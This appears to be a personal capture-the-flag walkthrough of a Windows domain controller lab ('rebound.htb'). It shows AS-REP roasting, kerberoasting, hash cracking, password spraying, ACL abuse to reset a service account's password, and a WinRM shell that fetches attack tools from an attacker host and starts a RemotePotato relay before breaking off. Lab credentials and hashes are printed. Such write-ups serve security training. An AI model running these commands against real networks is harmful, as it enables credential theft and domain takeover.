# Host file setup
```python
sudo nxc smb 10.129.14.17 --generate-hosts-file /etc/hosts                                     
[sudo] password for kali: 
SMB         10.129.14.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```
Few things note:
- Null auth is true
- SMB signing is enabled

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT dc01.rebound.htb                                                        
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-04 14:53 +0100
Nmap scan report for dc01.rebound.htb (10.129.14.17)
Host is up (0.015s latency).
rDNS record for 10.129.14.17: DC01.rebound.htb
Not shown: 65509 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49696/tcp open  unknown
49709/tcp open  unknown
49724/tcp open  unknown
49743/tcp open  unknown
59390/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.68 seconds
```
## Nmap
```python
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT dc01.rebound.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-04 14:55 +0100
Nmap scan report for dc01.rebound.htb (10.129.14.17)
Host is up (0.015s latency).
rDNS record for 10.129.14.17: DC01.rebound.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-04 20:55:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-04T20:56:09+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-04T20:56:09+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-04T20:56:09+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-04T20:56:09+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019|2012|2022|2016 (96%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows Server 2019 (95%), Windows Server 2019 (92%), Microsoft Windows 10 1709 - 21H2 (91%), Microsoft Windows 10 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2022 (91%), Microsoft Windows 10 20H2 (90%), Microsoft Windows 10 20H2 - 21H1 (90%), Microsoft Windows 10 1903 - 21H1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Nmap tell me the DC is running at +7h

# SMB (445)
Null auth is enabled but not able to use it to access shares or list users
## Guest access
The guest account is enabled

### Shares
```python
nxc smb dc01.rebound.htb -u 'Guest' -p '' --shares
SMB         10.129.14.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.17    445    DC01             [+] rebound.htb\Guest: 
SMB         10.129.14.17    445    DC01             [*] Enumerated shares
SMB         10.129.14.17    445    DC01             Share           Permissions     Remark
SMB         10.129.14.17    445    DC01             -----           -----------     ------
SMB         10.129.14.17    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.14.17    445    DC01             C$                              Default share
SMB         10.129.14.17    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.14.17    445    DC01             NETLOGON                        Logon server share 
SMB         10.129.14.17    445    DC01             Shared          READ            
SMB         10.129.14.17    445    DC01             SYSVOL                          Logon server share
```
`Shared` share is empty
### Users
```python
nxc smb dc01.rebound.htb -u 'Guest' -p '' --rid-brute 20000
SMB         10.129.14.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.17    445    DC01             [+] rebound.htb\Guest: 
SMB         10.129.14.17    445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.14.17    445    DC01             500: rebound\Administrator (SidTypeUser)
SMB         10.129.14.17    445    DC01             501: rebound\Guest (SidTypeUser)
SMB         10.129.14.17    445    DC01             502: rebound\krbtgt (SidTypeUser)
SMB         10.129.14.17    445    DC01             512: rebound\Domain Admins (SidTypeGroup)
SMB         10.129.14.17    445    DC01             513: rebound\Domain Users (SidTypeGroup)
SMB         10.129.14.17    445    DC01             514: rebound\Domain Guests (SidTypeGroup)
SMB         10.129.14.17    445    DC01             515: rebound\Domain Computers (SidTypeGroup)
SMB         10.129.14.17    445    DC01             516: rebound\Domain Controllers (SidTypeGroup)
SMB         10.129.14.17    445    DC01             517: rebound\Cert Publishers (SidTypeAlias)
SMB         10.129.14.17    445    DC01             518: rebound\Schema Admins (SidTypeGroup)
SMB         10.129.14.17    445    DC01             519: rebound\Enterprise Admins (SidTypeGroup)
SMB         10.129.14.17    445    DC01             520: rebound\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.14.17    445    DC01             521: rebound\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.14.17    445    DC01             522: rebound\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.14.17    445    DC01             525: rebound\Protected Users (SidTypeGroup)
SMB         10.129.14.17    445    DC01             526: rebound\Key Admins (SidTypeGroup)
SMB         10.129.14.17    445    DC01             527: rebound\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.14.17    445    DC01             553: rebound\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.14.17    445    DC01             571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.14.17    445    DC01             572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.14.17    445    DC01             1000: rebound\DC01$ (SidTypeUser)
SMB         10.129.14.17    445    DC01             1101: rebound\DnsAdmins (SidTypeAlias)
SMB         10.129.14.17    445    DC01             1102: rebound\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.14.17    445    DC01             1951: rebound\ppaul (SidTypeUser)
SMB         10.129.14.17    445    DC01             2952: rebound\llune (SidTypeUser)
SMB         10.129.14.17    445    DC01             3382: rebound\fflock (SidTypeUser)
SMB         10.129.14.17    445    DC01             5277: rebound\jjones (SidTypeUser)
SMB         10.129.14.17    445    DC01             5569: rebound\mmalone (SidTypeUser)
SMB         10.129.14.17    445    DC01             5680: rebound\nnoon (SidTypeUser)
SMB         10.129.14.17    445    DC01             7681: rebound\ldap_monitor (SidTypeUser)
SMB         10.129.14.17    445    DC01             7682: rebound\oorend (SidTypeUser)
SMB         10.129.14.17    445    DC01             7683: rebound\ServiceMgmt (SidTypeGroup)
SMB         10.129.14.17    445    DC01             7684: rebound\winrm_svc (SidTypeUser)
SMB         10.129.14.17    445    DC01             7685: rebound\batch_runner (SidTypeUser)
SMB         10.129.14.17    445    DC01             7686: rebound\tbrady (SidTypeUser)
SMB         10.129.14.17    445    DC01             7687: rebound\delegator$ (SidTypeUser
```
Found all the users, from here i can use this to generate a user list

With the users file i can perform something like AS-REP roasting

# AS-REP roasting
```python
nxc ldap dc01.rebound.htb -u users.txt -p '' --asreproast asrep.hash
LDAP        10.129.14.17    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb) (signing:Enforced) (channel binding:Always)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.129.14.17    389    DC01             $krb5asrep$23$jjones@REBOUND.HTB:0551ef0d6dbd461030bc230450267059$004a8353e9f2bcec2d8e66a34ade019a4660c9aaea16c75d70b90d4f3fe9793157b3b5ad344c34d0a1be85ad13414bd828f153567f82bde50da10b4904c51b9e8f32f2231174db41856fac773cc151f74c2c8b293ecc005ad2672938c413acf640b55f978dc1b5138f97aeec08fa9f60c30e6a03d93bcdc253f7254cbc0e0bbc75bb79ef3819c6b8d38608b09cf1d9b95ae69fba2351a309b1911f080fbeda95370e37382391313c7659c29a6309a70c888fc915413a5f7a7704b873b5930d5b8cfa3ac2358b7465ed400bfd7104ab66f203b86a72e6a8d5e6cb1ef4d9519b7b589f686ff1c2f9e603c2
```
I have found a hash!

## Cracking the hash
The hash did not crack but i can still use it

# Kerberoasting via AS-REP roasting
So since i cant crack the hash i can still use it to kerberoast another user

```python
nxc ldap dc01.rebound.htb -u jjones -p '' --no-preauth-targets users.txt --kerberoasting kerb.hash
LDAP        dc01.rebound.htb 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb) (signing:Enforced) (channel binding:Always)
LDAP        dc01.rebound.htb 389    DC01             [+] rebound.htb\jjones account vulnerable to asreproast attack 
LDAP        dc01.rebound.htb 389    DC01             [*] Skipping account: krbtgt, DC01$, delegator$
LDAP        dc01.rebound.htb 389    DC01             [*] Total of records returned 1
LDAP        dc01.rebound.htb 389    DC01             $krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$e5904c8b95fb4d9151068aeee7fb3129$6d96c58859d518bd5734e3705ca9b30cf51cd9cd0622a0229a70ff67a77a9b76cc3b4f79e5029a7ccf6b0ba6209ba584edee2ef3264ca3f126a4766cac60107c2ad9ee6db59b765f099b11d40192c4e65a203b3e1110c33777af60c70e627274b49d6d7a8534ade2d84b679321ff218a96d43435e252da587c97e09a3494a68072fc5ce1771fc51e844d8274e3d15ee705c034296549cb1588e14e4533936116a65a58c1d151583f5355f7a1edf310f39144ef7cd13165ea962e5cc864bc0e08a14a0087e3c1db353b17995953bb372a906872c8023f9ceaba202cf8f7545bc87ef9dc69d863a3504b242f6592fe05cfb51ce3e02cd6ff5bcc696f1dc0d4365da8cb11a7989e6f6929429ecc840cb06bc60c40eea4a16d4f510e7360eff60ac9053575ec70a082d24443a15a8f28868ff67f97f79e18fef2547d5791abd6b4d2238b56fc28d000517f1e8f4feb8529084760fc301256f04156fa9a2461c3499e911d744efbba676c6e7dcf2d04636559752b7e9a74aacc604290aa581b4a2b679011af71f6dab3f42884a5f2369c9515c7a547700702caf5a6e8681550b4ca0d1f3ee5a4e4bffecbcd40ca3b39665e98429706aa2911cf7395c629ba02fea0671e6bc29baca963d19d19ff332219f36b1d1122384785047033247560d4238982e94b0618d364a62f5abeb9ae5282ff19ad378c212a537bd558753ba4bed502f794c789aedbbf237cd0d2b79234c8602adf3c9f32c9d173032149a01a8a3111d1c16daffc67e1ad9119332a7e5cad2d745b06357fcb85aceb78f405f82fe6e4ebb5181f788ba96d0dc93d421ef5ca6890c9eed0362e0fc3957dfa4c12b0b9bb35ee872108803937b8b395c98b28c473f1a335492d7baef1eb6d0660c37e20a042c54d5e09934177ca89af7824fef63b21a19eaded8242d0785036d69480b39f53516136870a7292d634a9c320c22971ea40547d76906744e55cf37fca1e556446724961dddbf0f754675f9872fe022902a696254f4d0e59310da90e65e2d51d0e0e5255422c1f49487816044d01fa3543e4fa4f12ac1d4b6f9229688a9f1ef1a1362f1fd36a5a7fd4c7e46334df66f07358be05c7432a124469731ef22493fb7e1c546dfe1ed179504de471290119cc8a4c5ce28667b9b0463d45efa9d336b216af97658782235bb815f3bca60f6e5f8dbc87991ab21ce447983a52a14034efeea8500b8e6328e170303f251a9cb4f05ccb7a7a04ea9033668ced59f232bcc9006db72938406c544f5745929dae69b3192ed3a128a17848471836892f84e0b8f57abe7cb26710f22a52a4c3f3bc5e59aba9d0cd854d3d59da88f9f7ae5d4ef2fbd621
```
So we have dumped another hash and it seems that nxc is also skipping some other kerberoastable accounts for some reason

## Cracking the hash
```python
hashcat kerb.hash /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$e5904c8b95fb4d9151068aeee7fb3129$6d96c58859d518bd5734e3705ca9b30cf51cd9cd0622a0229a70ff67a77a9b76cc3b4f79e5029a7ccf6b0ba6209ba584edee2ef3264ca3f126a4766cac60107c2ad9ee6db59b765f099b11d40192c4e65a203b3e1110c33777af60c70e627274b49d6d7a8534ade2d84b679321ff218a96d43435e252da587c97e09a3494a68072fc5ce1771fc51e844d8274e3d15ee705c034296549cb1588e14e4533936116a65a58c1d151583f5355f7a1edf310f39144ef7cd13165ea962e5cc864bc0e08a14a0087e3c1db353b17995953bb372a906872c8023f9ceaba202cf8f7545bc87ef9dc69d863a3504b242f6592fe05cfb51ce3e02cd6ff5bcc696f1dc0d4365da8cb11a7989e6f6929429ecc840cb06bc60c40eea4a16d4f510e7360eff60ac9053575ec70a082d24443a15a8f28868ff67f97f79e18fef2547d5791abd6b4d2238b56fc28d000517f1e8f4feb8529084760fc301256f04156fa9a2461c3499e911d744efbba676c6e7dcf2d04636559752b7e9a74aacc604290aa581b4a2b679011af71f6dab3f42884a5f2369c9515c7a547700702caf5a6e8681550b4ca0d1f3ee5a4e4bffecbcd40ca3b39665e98429706aa2911cf7395c629ba02fea0671e6bc29baca963d19d19ff332219f36b1d1122384785047033247560d4238982e94b0618d364a62f5abeb9ae5282ff19ad378c212a537bd558753ba4bed502f794c789aedbbf237cd0d2b79234c8602adf3c9f32c9d173032149a01a8a3111d1c16daffc67e1ad9119332a7e5cad2d745b06357fcb85aceb78f405f82fe6e4ebb5181f788ba96d0dc93d421ef5ca6890c9eed0362e0fc3957dfa4c12b0b9bb35ee872108803937b8b395c98b28c473f1a335492d7baef1eb6d0660c37e20a042c54d5e09934177ca89af7824fef63b21a19eaded8242d0785036d69480b39f53516136870a7292d634a9c320c22971ea40547d76906744e55cf37fca1e556446724961dddbf0f754675f9872fe022902a696254f4d0e59310da90e65e2d51d0e0e5255422c1f49487816044d01fa3543e4fa4f12ac1d4b6f9229688a9f1ef1a1362f1fd36a5a7fd4c7e46334df66f07358be05c7432a124469731ef22493fb7e1c546dfe1ed179504de471290119cc8a4c5ce28667b9b0463d45efa9d336b216af97658782235bb815f3bca60f6e5f8dbc87991ab21ce447983a52a14034efeea8500b8e6328e170303f251a9cb4f05ccb7a7a04ea9033668ced59f232bcc9006db72938406c544f5745929dae69b3192ed3a128a17848471836892f84e0b8f57abe7cb26710f22a52a4c3f3bc5e59aba9d0cd854d3d59da88f9f7ae5d4ef2fbd621:1GR8t@$$4u
```
Ive cracked the hash

```python
ldap_monitor:1GR8t@$$4u
```
Ill now validate these creds

```python
nxc smb dc01.rebound.htb -u ldap_monitor -p '1GR8t@$$4u' --shares                                
SMB         10.129.14.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.17    445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
SMB         10.129.14.17    445    DC01             [*] Enumerated shares
SMB         10.129.14.17    445    DC01             Share           Permissions     Remark
SMB         10.129.14.17    445    DC01             -----           -----------     ------
SMB         10.129.14.17    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.14.17    445    DC01             C$                              Default share
SMB         10.129.14.17    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.14.17    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.14.17    445    DC01             Shared          READ            
SMB         10.129.14.17    445    DC01             SYSVOL          READ            Logon server share
```
This user is compromised, no interesting access on shares
# Password spray leads to user compromise
```python
nxc smb dc01.rebound.htb -u users.txt -p '1GR8t@$$4u' --continue-on-success 
SMB         10.129.14.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.17    445    DC01             [-] rebound.htb\Administrator:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.14.17    445    DC01             [-] rebound.htb\Guest:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.14.17    445    DC01             [-] rebound.htb\krbtgt:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.14.17    445    DC01             [-] rebound.htb\DC01$:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.14.17    445    DC01             [-] rebound.htb\ppaul:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.14.17    445    DC01             [-] rebound.htb\llune:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.14.17    445    DC01             [-] rebound.htb\fflock:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.14.17    445    DC01             [-] rebound.htb\jjones:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.14.17    445    DC01             [-] rebound.htb\mmalone:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.14.17    445    DC01             [-] rebound.htb\nnoon:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.14.17    445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
SMB         10.129.14.17    445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
SMB         10.129.14.17    445    DC01             [-] rebound.htb\winrm_svc:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.14.17    445    DC01             [-] rebound.htb\batch_runner:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.14.17    445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.14.17    445    DC01             [-] rebound.htb\delegator$:1GR8t@$$4u STATUS_LOGON_FAILURE
```
There is another user using the same password as `ldap_monitor`

```python
oorend:1GR8t@$$4u
```

This user also has no more access on SMB

# Bloodhound
## Loot collection
```python
faketime -f +7h nxc ldap dc01.rebound.htb -u 'ldap_monitor' -p '1GR8t@$$4u' -k --dns-server 10.129.14.17 --bloodhound -c All
LDAP        dc01.rebound.htb 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb) (signing:Enforced) (channel binding:Always)
LDAP        dc01.rebound.htb 389    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
LDAP        dc01.rebound.htb 389    DC01             Resolved collection methods: session, dcom, psremote, group, container, objectprops, localadmin, rdp, acl, trusts
LDAP        dc01.rebound.htb 389    DC01             Using kerberos auth without ccache, getting TGT
LDAP        dc01.rebound.htb 389    DC01             Done in 0M 4S
LDAP        dc01.rebound.htb 389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_dc01.rebound.htb_2026-04-04_222023_bloodhound.zip
```
Ive had to use kerberos authentication to collect the loot

![[Pasted image 20260404152455.png]]
I can add myself to this group

# Adding `oorend` to `servicemgmt`
```python
faketime -f +7h bloodyAD -k --host dc01.rebound.htb -d rebound.htb -u oorend -p '1GR8t@$$4u' add groupMember 'servicemgmt' 'oorend'

[+] oorend added to servicemgmt
```
Ive added the user to the group

![[Pasted image 20260404152926.png]]
Now i have `GenericAll` over the OU

![[Pasted image 20260404153153.png]]
This means i should be able to compromise `winrm_svc` and since they are apart of `remote management users` i should be able to get shell access as that user

# Giving GenericAll to all child objects in the OU
```python
faketime -f +7h dacledit.py -k -no-pass -action 'write' -rights 'FullControl' -inheritance -principal 'oorend' -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'rebound.htb'/'oorend':'1GR8t@$$4u' -use-ldaps
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20260404-230648.bak
[*] DACL modified successfully!
```
This now means i have GenericAll over everything connected to the OU including the `winrm_svc` account

```python
faketime -f +7h bloodyAD -k --host dc01.rebound.htb -d rebound.htb -u oorend -p '1GR8t@$$4u' set password 'winrm_svc' 'Password123!'

[+] Password changed successfully!
```
The password is now changed ill double check this just to be safe

```python
nxc smb dc01.rebound.htb -u 'winrm_svc' -p 'Password123!'                                               
SMB         10.129.14.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.17    445    DC01             [+] rebound.htb\winrm_svc:Password123!
```
This user is now compromised

# Evil-winrm as `winrm_svc`
```python
evil-winrm -i dc01.rebound.htb -u 'winrm_svc' -p 'Password123!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> dir


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/4/2026   1:49 PM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
70c59b857470aef4bc448f0275c90502
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> 
```
I now have shell access as this user!

# Running sharphound collection
```python
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> wget http://10.10.14.90:8000/SharpHound.exe -o sharphound.exe
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./sharphound.exe -c all
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> download 20260404151948_BloodHound.zip
                                        
Info: Downloading C:\Users\winrm_svc\Documents\20260404151948_BloodHound.zip to 20260404151948_BloodHound.zip
                                        
Info: Download successful!
```
This shows me getting the exe file and running it then downloading the collection

![[Pasted image 20260404162451.png]]
After ingesting the new data into bloodhound i see that there is another user with an active session `tbrady`

I can try something like remotepotato

# RemotePotato
```python
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> wget http://10.10.14.90:8000/RunasCs.exe -o run.exe
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./run.exe winrm_svc 'Password123!' qwinsta -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           tbrady                    1  Active
```
I have found the session ID of `tbrady`

```python
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> wget http://10.10.14.90:8000/RemotePotato0.exe -o rp.exe
```
This tranfered it to the target

```python
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.14.17:8080
```
This set a listener

```python
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./rp.exe -m 2 -s 1 -x 10.10.14.90 -p 8080
```
This ran the command 
